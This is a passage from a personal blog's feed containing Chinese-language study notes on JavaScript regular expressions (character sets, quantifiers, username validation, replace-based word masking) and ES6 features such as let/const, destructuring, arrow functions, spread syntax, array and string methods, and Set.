class="comment">//26个英文小写字母任何一个字母都返回true</span></span><br><span class="line"><span class="keyword">var</span> rg1 = <span class="regexp">/^[a-zA-Z]$/</span>;  <span class="comment">//26个英文字母任何一个字母都返回true</span></span><br><span class="line"><span class="keyword">var</span> rg2 = <span class="regexp">/^[a-z0-9_-]$/</span>; <span class="comment">//任何单个26小写字母，0-9数字，_, -,都返回true</span></span><br></pre></td></tr></table></figure><p><strong>[^]方括号内部 取反符^</strong> 表示取反的意思。注意和边界符 ^ 区别，边界符写到方括号外面。 </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rg = <span class="regexp">/^[^a-z]$/</span>;  <span class="comment">//26个英文小写字母任何一个字母都返回false</span></span><br></pre></td></tr></table></figure><p><strong>字符组合：</strong>方括号内部可以使用字符组合，这里表示包含 a 到 z 的26个英文字母和 1 到 9 的数字都可以。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/[a-z1-<span class="number">9</span>]/.test(<span class="string">&#x27;andy&#x27;</span>)     <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h3 id="量词符"><a href="#量词符" class="headerlink" title="量词符"></a><strong>量词符</strong></h3><p>用来设定某个模式出现的次数，有<code>*</code>、 <code>+</code>、 <code>？</code>、 <code>&#123;&#125;</code>，<code>&#123;&#125;</code>的量词间不要有空格，可以用test来检测下方正则表达式</p><p><img src="https://i.loli.net/2021/06/07/ZMGynQa5FsN6pVI.jpg" alt="Snipaste_2021-06-07_15-07-36.jpg"></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rg = <span class="regexp">/^a*$/</span>;  <span class="comment">//a可以出现0-n次，n&gt;=0 </span></span><br><span class="line"><span class="keyword">var</span> rg1 = <span class="regexp">/^a+$/</span>; <span class="comment">//a可以出现1-n次，n&gt;=1</span></span><br><span class="line"><span class="keyword">var</span> rg2 = <span class="regexp">/^a?$/</span>; <span class="comment">//a可以出现1或0次 (?也可以表示禁止贪婪，往最少的匹配方式去选择)</span></span><br><span class="line"><span class="keyword">var</span> rg3 = <span class="regexp">/^a&#123;3&#125;$/</span>; <span class="comment">//a只能可以出现3次</span></span><br><span class="line"><span class="keyword">var</span> rg4 = <span class="regexp">/^a&#123;3,&#125;$/</span>; <span class="comment">//a只可以出现3-n次 n&gt;=3 </span></span><br><span class="line"><span class="keyword">var</span> rg5 = <span class="regexp">/^a&#123;3,16&#125;$/</span>; <span class="comment">//a只可以出现3-16次</span></span><br><span class="line"><span class="comment">//普遍的用户名规定：</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="regexp">/^[a-zA-Z0-9_-]&#123;6, 16&#125;$/</span></span><br></pre></td></tr></table></figure><h3 id="用户名验证案例"><a href="#用户名验证案例" class="headerlink" title="用户名验证案例"></a><strong>用户名验证案例</strong></h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  量词是设定某个模式出现的次数</span></span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/^[a-zA-Z0-9_-]&#123;6,16&#125;$/</span>; <span class="comment">// 这个模式用户只能输入英文字母 数字 下划线 短横线但是有边界符和[] 这就限定了只能多选1</span></span><br><span class="line"><span class="keyword">var</span> uname = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;.uname&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> span = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;span&#x27;</span>);</span><br><span class="line">uname.onblur = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (reg.test(<span class="built_in">this</span>.value)) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;正确的&#x27;</span>);</span><br><span class="line">        span.className = <span class="string">&#x27;right&#x27;</span>;</span><br><span class="line">        span.innerHTML = <span class="string">&#x27;用户名格式输入正确&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;错误的&#x27;</span>);</span><br><span class="line">        span.className = <span class="string">&#x27;wrong&#x27;</span>;</span><br><span class="line">        span.innerHTML = <span class="string">&#x27;用户名格式输入不正确&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="括号总结"><a href="#括号总结" class="headerlink" title="括号总结"></a><strong>括号总结</strong></h3><ul><li><code>[]</code>中括号：字符集合，匹配方括号中的任意字符</li><li><code>&#123;&#125;</code> 大括号：量词符，里面表示重复次数，但只让大括号前面一个字符重复 （注意：<code>/^abc&#123;3&#125;$/</code>，只让c重复三次，即abccc）</li><li><code>()</code> 小括号：表示优先级 可以用来：<code>/^(abc)&#123;3&#125;$/</code>，表示让abc重复三次，即abcabc</li></ul><h3 id="预定义类"><a href="#预定义类" class="headerlink" title="预定义类"></a>预定义类</h3><p>预定义类指的是某些常见模式的<strong>简写方式</strong>。</p><p><img src="https://i.loli.net/2021/06/07/ARhQDZ6CXcrUuw1.jpg" alt="Snipaste_2021-06-07_14-59-12.jpg"></p><h2 id="正则表达式中的替换"><a href="#正则表达式中的替换" class="headerlink" title="正则表达式中的替换"></a>正则表达式中的替换</h2><h3 id="replace-替换"><a href="#replace-替换" class="headerlink" title="replace 替换"></a><strong>replace</strong> <strong>替换</strong></h3><p>replace() 方法可以实现替换字符串操作，用来替换的参数可以是一个字符串或是一个正则表达式。</p><p>  <code>stringObject.replace(regexp/substr,replacement)</code></p><ol><li>第一个参数:  被替换的字符串 或者 正则表达式</li><li>第二个参数:  替换为的字符串</li><li>返回值是一个替换完毕的新字符串</li></ol><p>但是replace只能替换掉第一个匹配的字符/正则表达式，无法满足替换掉多个敏感词</p><p>可以使用: <code>/表达式/[switch]</code> swtich也成为修饰符，即按照什么样的模式来匹配</p><h3 id="敏感词过渡案例"><a href="#敏感词过渡案例" class="headerlink" title="敏感词过渡案例"></a><strong>敏感词过渡案例</strong></h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> text = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;textarea&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> btn = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;button&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    div.innerHTML = text.value.replace(<span class="regexp">/red|blue/g</span>, <span class="string">&#x27;**&#x27;</span>); <span class="comment">// 把 red blue 替换成**</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="ES6"><a href="#ES6" class="headerlink" title="ES6"></a>ES6</h1><p>ES 的全称是 ECMAScript , 它是由 ECMA 国际标准化组织,制定的<strong>一项脚本语言的标准化规范</strong>。</p><h2 id="let"><a href="#let" class="headerlink" title="let"></a><strong>let</strong></h2><p><strong>let声明的变量只在所处于的块级有效</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123; </span><br><span class="line">     <span class="keyword">let</span> a = <span class="number">10</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">console</span>.log(a) <span class="comment">// a is not defined</span></span><br></pre></td></tr></table></figure><blockquote><p>注意：使用let关键字声明的变量才具有块级作用域，使用var声明的变量不具备块级作用域特性。</p></blockquote><p><strong>不存在变量提升</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(a); <span class="comment">// a is not defined </span></span><br><span class="line"><span class="keyword">let</span> a = <span class="number">20</span>;</span><br></pre></td></tr></table></figure><p><strong>暂时性死区</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> tmp = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123; </span><br><span class="line">    tmp = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    <span class="keyword">let</span> tmp; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><strong>经典面试题</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">    arr[i] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">arr[<span class="number">0</span>]();</span><br><span class="line">arr[<span class="number">1</span>]();</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/07/HJeYAPzISwTdM67.jpg" alt="Snipaste_2021-06-07_15-34-38.jpg"></p><p><strong>图解：</strong>此题的关键点在于每次循环都会产生一个块级作用域，每个块级作用域中的变量都是不同的，函数执行时输出的是自己上一级（循环产生的块级作用域）作用域下的i值。</p><h2 id="const"><a href="#const" class="headerlink" title="const"></a><strong>const</strong></h2><p>作用：声明常量，常量就是值（内存地址）不能变化的量。</p><p><strong>具有块级作用域</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123; </span><br><span class="line">    <span class="keyword">const</span> a = <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(a) <span class="comment">// a is not defined</span></span><br></pre></td></tr></table></figure><p><strong>声明常量时必须赋值</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> PI; <span class="comment">// Missing initializer in const declaration</span></span><br><span class="line"><span class="keyword">const</span> PI = <span class="number">3.14</span>;</span><br></pre></td></tr></table></figure><p><strong>常量赋值后，值不能修改。</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> PI = <span class="number">3.14</span>;</span><br><span class="line">PI = <span class="number">100</span>; <span class="comment">// Assignment to constant variable. </span></span><br><span class="line"><span class="keyword">const</span> ary = [<span class="number">100</span>, <span class="number">200</span>];</span><br><span class="line">ary[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>; ary[<span class="number">1</span>] = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(ary); <span class="comment">// [&#x27;a&#x27;, &#x27;b&#x27;]; </span></span><br><span class="line">ary = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>]; <span class="comment">// Assignment to constant variable.</span></span><br></pre></td></tr></table></figure><h2 id="let、const、var-的区别"><a href="#let、const、var-的区别" class="headerlink" title="let、const、var 的区别"></a><strong>let</strong>、<strong><strong>const</strong></strong>、var <strong>的区别</strong></h2><ol><li>使用 var 声明的变量，其作用域为该语句所在的函数内，且存在变量提升现象。</li><li>使用 let 声明的变量，其作用域为该语句所在的代码块内，不存在变量提升。</li><li>使用 const 声明的是常量，在后面出现的代码中不能再修改该常量的值。</li></ol><p><img src="https://i.loli.net/2021/06/07/a1g5iulkjcfoNPM.jpg" alt="Snipaste_2021-06-07_15-38-24.jpg"></p><h2 id="解构赋值"><a href="#解构赋值" class="headerlink" title="解构赋值"></a><strong>解</strong>构赋值</h2><p>ES6中允许从数组中提取值，按照对应位置，对变量赋值。对象也可以实现解构。</p><h3 id="数组解构"><a href="#数组解构" class="headerlink" title="数组解构"></a><strong>数组解构</strong></h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 数组解构允许我们按照一一对应的关系从数组中提取值 然后将值赋值给变量</span></span><br><span class="line"><span class="keyword">let</span> ary = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> [a, b, c, d, e] = ary;</span><br><span class="line"><span class="built_in">console</span>.log(a) <span class="comment">// 1</span></span><br><span class="line"><span class="built_in">console</span>.log(b) <span class="comment">// 2</span></span><br><span class="line"><span class="built_in">console</span>.log(c) <span class="comment">// 3</span></span><br><span class="line"><span class="built_in">console</span>.log(d) <span class="comment">// undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(e) <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><h3 id="对象解构"><a href="#对象解构" class="headerlink" title="对象解构"></a><strong>对象</strong>解构</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 对象解构允许我们使用变量的名字匹配对象的属性 匹配成功 将对象属性的值赋值给变量</span></span><br><span class="line"><span class="keyword">let</span> person = &#123;<span class="attr">name</span>: <span class="string">&#x27;lisi&#x27;</span>, <span class="attr">age</span>: <span class="number">30</span>, <span class="attr">sex</span>: <span class="string">&#x27;男&#x27;</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> &#123; name, age, sex &#125; = person;</span><br><span class="line"><span class="built_in">console</span>.log(name) <span class="comment">// lisi</span></span><br><span class="line"><span class="built_in">console</span>.log(age)  <span class="comment">// 30</span></span><br><span class="line"><span class="built_in">console</span>.log(sex)  <span class="comment">// 男</span></span><br><span class="line"><span class="keyword">let</span> &#123;<span class="attr">name</span>: myName&#125; = person; <span class="comment">// myName 属于别名</span></span><br><span class="line"><span class="built_in">console</span>.log(myName) <span class="comment">// lisi</span></span><br></pre></td></tr></table></figure><h2 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a><strong>箭头函数</strong></h2><p>ES6中新增的定义函数的方式。</p><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>箭头函数是用来简化函数定义语法的</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fn = <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">123</span>)</span><br><span class="line">&#125;</span><br><span class="line">fn();</span><br></pre></td></tr></table></figure><p>在箭头函数中，如果函数体中只有一句代码，且代码的执行结果就是返回值，可以省略大括号</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sum = <span class="function">(<span class="params">n1, n2</span>) =&gt;</span> n1 + n2; </span><br><span class="line"><span class="keyword">const</span> result = sum(<span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line"><span class="built_in">console</span>.log(result)</span><br></pre></td></tr></table></figure><p>在箭头函数中如果形参只有一个，形参外侧的小括号也是可以省略的</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fn = <span class="function"><span class="params">v</span> =&gt;</span> &#123;</span><br><span class="line">alert(v);</span><br><span class="line">&#125;</span><br><span class="line">fn(<span class="number">20</span>)</span><br></pre></td></tr></table></figure><p>箭头函数若不绑定 this ，则箭头函数没有自己的 this 关键字。this关键字将指向<strong>箭头函数定义位置</strong>中的上下文this（一般 window ）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">this</span>); <span class="comment">// window</span></span><br><span class="line"><span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">this</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> obj = &#123;<span class="attr">name</span>: <span class="string">&#x27;zhangsan&#x27;</span>&#125;;</span><br><span class="line"><span class="keyword">const</span> resFn = fn.call(obj);</span><br><span class="line">resFn(); <span class="comment">// zhangsan</span></span><br></pre></td></tr></table></figure><h3 id="面试题"><a href="#面试题" class="headerlink" title="面试题"></a>面试题</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> age = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line"><span class="attr">age</span>: <span class="number">20</span>,</span><br><span class="line"><span class="attr">say</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">alert(<span class="built_in">this</span>.age)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.say(); <span class="comment">// 100</span></span><br></pre></td></tr></table></figure><h2 id="剩余参数"><a href="#剩余参数" class="headerlink" title="剩余参数"></a><strong>剩余参数</strong></h2><p>剩余参数语法允许我们将一个不定数量的参数表示为一个数组。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span> (<span class="params">first, ...args</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(first); <span class="comment">// 10</span></span><br><span class="line">    <span class="built_in">console</span>.log(args); <span class="comment">// [20, 30] </span></span><br><span class="line">&#125;</span><br><span class="line">sum(<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>)</span><br></pre></td></tr></table></figure><p>剩余参数和解构配合使用</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> students = [<span class="string">&#x27;wangwu&#x27;</span>, <span class="string">&#x27;zhangsan&#x27;</span>, <span class="string">&#x27;lisi&#x27;</span>];</span><br><span class="line"><span class="keyword">let</span> [s1, ...s2] = students; </span><br><span class="line"><span class="built_in">console</span>.log(s1);  <span class="comment">// &#x27;wangwu&#x27; </span></span><br><span class="line"><span class="built_in">console</span>.log(s2);  <span class="comment">// [&#x27;zhangsan&#x27;, &#x27;lisi&#x27;]</span></span><br></pre></td></tr></table></figure><h2 id="Array-的扩展方法"><a href="#Array-的扩展方法" class="headerlink" title="Array 的扩展方法"></a><strong>Array</strong> <strong>的扩展方法</strong></h2><h3 id="扩展运算符（展开语法"><a href="#扩展运算符（展开语法" class="headerlink" title="扩展运算符（展开语法)"></a><strong>扩展运算符（展开语法)</strong></h3><p>扩展运算符可以将数组或者对象转为用逗号分隔的参数序列。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> ary = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">...ary  <span class="comment">// 1, 2, 3</span></span><br><span class="line"><span class="built_in">console</span>.log(...ary);    <span class="comment">// 1 2 3</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>扩展运算符可以应用于合并数组。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方法一 </span></span><br><span class="line"> <span class="keyword">let</span> ary1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]; <span class="keyword">let</span> ary2 = [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"> <span class="keyword">let</span> ary3 = [...ary1, ...ary2];</span><br><span class="line"> <span class="comment">// 方法二 </span></span><br><span class="line"> ary1.push(...ary2);</span><br></pre></td></tr></table></figure><p>将类数组或可遍历对象转换为真正的数组</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> oDivs = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;div&#x27;</span>); </span><br><span class="line">oDivs = [...oDivs];</span><br></pre></td></tr></table></figure><h3 id="构造函数方法：Array-from"><a href="#构造函数方法：Array-from" class="headerlink" title="构造函数方法：Array.from()"></a><strong>构造函数方法：</strong>Array.from()</h3><p>将类数组或可遍历对象转换为真正的数组</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arrayLike = &#123;</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="attr">length</span>: <span class="number">3</span></span><br><span class="line">&#125;; </span><br><span class="line"><span class="keyword">let</span> arr2 = <span class="built_in">Array</span>.from(arrayLike); <span class="comment">// [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]</span></span><br></pre></td></tr></table></figure><p>方法还可以接受第二个参数，作用类似于数组的map方法，用来对每个元素进行处理，将处理后的值放入返回的数组。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arrayLike = &#123; </span><br><span class="line">    <span class="string">&quot;0&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;1&quot;</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="string">&quot;length&quot;</span>: <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> newAry = <span class="built_in">Array</span>.from(aryLike, <span class="function"><span class="params">item</span> =&gt;</span> item *<span class="number">2</span>)</span><br></pre></td></tr></table></figure><h3 id="实例方法：find"><a href="#实例方法：find" class="headerlink" title="实例方法：find()"></a><strong>实例方法：</strong>find()</h3><p>用于找出第一个符合条件的数组成员，如果没有找到返回undefined</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> ary = [&#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;张三‘</span></span><br><span class="line"><span class="string">&#125;, &#123; </span></span><br><span class="line"><span class="string">    id: 2,</span></span><br><span class="line"><span class="string">    name: &#x27;</span>李四‘</span><br><span class="line">&#125;]; </span><br><span class="line"><span class="keyword">let</span> target = ary.find(<span class="function">(<span class="params">item, index</span>) =&gt;</span> item.id == <span class="number">2</span>);</span><br></pre></td></tr></table></figure><h3 id="实例方法：findIndex"><a href="#实例方法：findIndex" class="headerlink" title="实例方法：findIndex()"></a><strong>实例方法：</strong>findIndex()</h3><p>用于找出第一个符合条件的数组成员的位置，如果没有找到返回-1</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> ary = [<span class="number">1</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>];</span><br><span class="line"><span class="keyword">let</span> index = ary.findIndex(<span class="function">(<span class="params">value, index</span>) =&gt;</span> value &gt; <span class="number">9</span>); </span><br><span class="line"><span class="built_in">console</span>.log(index); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><h3 id="实例方法：includes"><a href="#实例方法：includes" class="headerlink" title="实例方法：includes()"></a><strong>实例方法：</strong>includes()</h3><p>表示某个数组是否包含给定的值，返回布尔值。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>) <span class="comment">// true </span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">4</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure><h2 id="String-的扩展方法"><a href="#String-的扩展方法" class="headerlink" title="String 的扩展方法"></a><strong>String</strong> <strong>的扩展方法</strong></h2><h3 id="模板字符串"><a href="#模板字符串" class="headerlink" title="模板字符串"></a><strong>模板字符串</strong></h3><p>ES6新增的创建字符串的方式，使用反引号定义。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> name = <span class="string">`zhangsan`</span>;</span><br></pre></td></tr></table></figure><p>模板字符串中可以解析变量。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> name = <span class="string">&#x27;张三&#x27;</span>; </span><br><span class="line"><span class="keyword">let</span> sayHello = <span class="string">`hello,my name is <span class="subst">$&#123;name&#125;</span>`</span>; <span class="comment">// hello, my name is zhangsan</span></span><br></pre></td></tr></table></figure><p>模板字符串中可以换行</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> result = &#123; </span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;zhangsan&#x27;</span>, </span><br><span class="line">    <span class="attr">age</span>: <span class="number">20</span>, </span><br><span class="line">    <span class="attr">sex</span>: <span class="string">&#x27;男&#x27;</span> </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">let</span> html = <span class="string">` &lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;span&gt;<span class="subst">$&#123;result.name&#125;</span>&lt;/span&gt;</span></span><br><span class="line"><span class="string">    &lt;span&gt;<span class="subst">$&#123;result.age&#125;</span>&lt;/span&gt;</span></span><br><span class="line"><span class="string">    &lt;span&gt;<span class="subst">$&#123;result.sex&#125;</span>&lt;/span&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt; `</span>;</span><br></pre></td></tr></table></figure><p>在模板字符串中可以调用函数。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sayHello = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; </span><br><span class="line">   <span class="keyword">return</span> <span class="string">&#x27;哈哈哈哈 追不到我吧 我就是这么强大&#x27;</span>;</span><br><span class="line">&#125;; </span><br><span class="line"><span class="keyword">let</span> greet = <span class="string">`<span class="subst">$&#123;sayHello()&#125;</span> 哈哈哈哈`</span>; </span><br><span class="line"><span class="built_in">console</span>.log(greet); <span class="comment">// 哈哈哈哈 追不到我吧 我就是这么强大 哈哈哈哈</span></span><br></pre></td></tr></table></figure><h3 id="实例方法：startsWith-和-endsWith"><a href="#实例方法：startsWith-和-endsWith" class="headerlink" title="实例方法：startsWith()和 endsWith()"></a><strong>实例方法：</strong>startsWith()<strong>和</strong> <strong>endsWith</strong>()</h3><ul><li>startsWith()：表示参数字符串是否在原字符串的头部，返回布尔值</li><li>endsWith()：表示参数字符串是否在原字符串的尾部，返回布尔值</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;Hello world!&#x27;</span>;</span><br><span class="line">str.startsWith(<span class="string">&#x27;Hello&#x27;</span>) <span class="comment">// true </span></span><br><span class="line">str.endsWith(<span class="string">&#x27;!&#x27;</span>)       <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h3 id="实例方法：repeat"><a href="#实例方法：repeat" class="headerlink" title="实例方法：repeat()"></a><strong>实例方法：</strong>repeat()</h3><p>repeat方法表示将原字符串重复n次，返回一个新字符串。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;x&#x27;</span>.repeat(<span class="number">3</span>)      <span class="comment">// &quot;xxx&quot; </span></span><br><span class="line"><span class="string">&#x27;hello&#x27;</span>.repeat(<span class="number">2</span>)  <span class="comment">// &quot;hellohello&quot;</span></span><br></pre></td></tr></table></figure><h2 id="Set-数据结构"><a href="#Set-数据结构" class="headerlink" title="Set 数据结构"></a><strong>Set</strong> <strong>数据结构</strong></h2><p>ES6 提供了新的数据结构 Set。它类似于数组，但是成员的值都是唯一的，没有重复的值。</p><p>Set本身是一个构造函数，用来生成 Set 数据结构。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br></pre></td></tr></table></figure><p>Set函数可以接受一个数组作为参数，用来初始化。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>]);</span><br></pre></td></tr></table></figure><h3 id="实例方法"><a href="#实例方法" class="headerlink" title="实例方法"></a><strong>实例方法</strong></h3><ul><li>add(value)：添加某个值，返回 Set 结构本身</li><li>ldelete(value)：删除某个值，返回一个布尔值，表示删除是否成功</li><li>has(value)：返回一个布尔值，表示该值是否为 Set 的成员</li><li>clear()：清除所有成员，没有返回值</li></ul><h3 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a><strong>遍历</strong></h3><p>Set 结构的实例与数组一样，也拥有forEach方法，用于对每个成员执行某种操作，没有返回值。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">s.forEach(<span class="function"><span class="params">value</span> =&gt;</span> <span class="built_in">console</span>.log(value))</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本文是我在跟学&lt;a href=&quot;https://www.bilibili.com/video/BV1Kt411w7MP&quot;&gt;B站javascr</summary>
      
    
    
    
    <category term="阅读笔记" scheme="https://asura1211.github.io/categories/%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="JavaScript" scheme="https://asura1211.github.io/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>我的第一篇博客文章</title>
    <link href="https://asura1211.github.io/2021/05/30/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0/"/>
    <id>https://asura1211.github.io/2021/05/30/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0/</id>
    <published>2021-05-30T08:58:31.000Z</published>
    <updated>2021-06-10T14:12:15.766Z</updated>
    
